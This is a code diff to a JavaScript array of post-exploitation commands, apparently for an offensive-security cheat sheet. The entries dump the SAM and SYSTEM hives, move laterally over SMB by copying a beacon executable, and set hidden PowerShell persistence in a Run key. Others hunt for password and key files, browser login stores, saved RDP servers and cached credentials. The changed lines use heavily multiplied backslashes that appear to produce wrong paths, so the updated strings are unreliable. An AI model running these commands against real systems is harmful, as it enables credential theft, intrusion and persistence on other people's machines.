@@ -983,7 +983,7 @@ const COMMANDS = [
   },
   {
     title: "Dump SAM/SYSTEM Hives",
-    code: "reg save HKLM\SAM C:\temp\sam.save; reg save HKLM\SYSTEM C:\temp\system.save",
+    code: "reg save HKLM\\\\SAM C:\\\\temp\\\\sam.save; reg save HKLM\\\\SYSTEM C:\\\\temp\\\\system.save",
     tags: ["ps", "postexploit", "privesc"],
     accent: "#ff9800"
   },
@@ -1019,13 +1019,13 @@ const COMMANDS = [
   },
   {
     title: "SMB Lateral Movement",
-    code: "net use \\TARGET\C$ /user:DOMAIN\user password; copy beacon.exe \\TARGET\C$\temp\\",
+    code: "net use \\\\\\\\TARGET\\\\C$ /user:DOMAIN\\\\user password; copy beacon.exe \\\\\\\\TARGET\\\\C$\\\\temp\\\\",
     tags: ["cmd", "postexploit", "lateral"],
     accent: "#ff9800"
   },
   {
     title: "Registry Run Persistence",
-    code: "Set-ItemProperty -Path \"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\" -Name \"Update\" -Value \"powershell -w hidden -enc BASE64\"",
+    code: "Set-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name 'Update' -Value 'powershell -w hidden -enc BASE64'",
     tags: ["ps", "postexploit", "persist"],
     accent: "#ff9800"
   },
@@ -1037,25 +1037,25 @@ const COMMANDS = [
   },
   {
     title: "Find Sensitive Files",
-    code: "Get-ChildItem -Path C:\Users -Recurse -Include \"*.kdbx\",\"*.key\",\"*password*\",\"*credential*\",\"*.rdp\",\"*.ppk\" -ErrorAction SilentlyContinue",
+    code: "Get-ChildItem -Path C:\\\\Users -Recurse -Include '*.kdbx','*.key','*password*','*credential*','*.rdp','*.ppk' -ErrorAction SilentlyContinue",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Chrome Login Data Location",
-    code: "dir \"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data\"",
+    code: "dir $env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\'User Data'\\\\Default\\\\'Login Data'",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Firefox Passwords Location",
-    code: "dir \"$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json\"",
+    code: "dir $env:APPDATA\\\\Mozilla\\\\Firefox\\\\Profiles\\\\*\\\\logins.json",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "RDP Saved Connections",
-    code: "reg query \"HKCU\Software\Microsoft\Terminal Server Client\Servers\"",
+    code: "reg query 'HKCU\\\\Software\\\\Microsoft\\\\Terminal Server Client\\\\Servers'",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
@@ -1091,13 +1091,13 @@ const COMMANDS = [
   },
   {
     title: "Recent Documents",
-    code: "Get-ChildItem \"$env:APPDATA\Microsoft\Windows\Recent\" -ErrorAction SilentlyContinue",
+    code: "Get-ChildItem $env:APPDATA\\\\Microsoft\\\\Windows\\\\Recent -ErrorAction SilentlyContinue",
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
   {
     title: "Cached Domain Creds Count",
-    code: "reg query \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\" /v CachedLogonsCount",
+    code: "reg query 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon' /v CachedLogonsCount",
     tags: ["cmd", "postexploit"],
     accent: "#ff9800"
   },
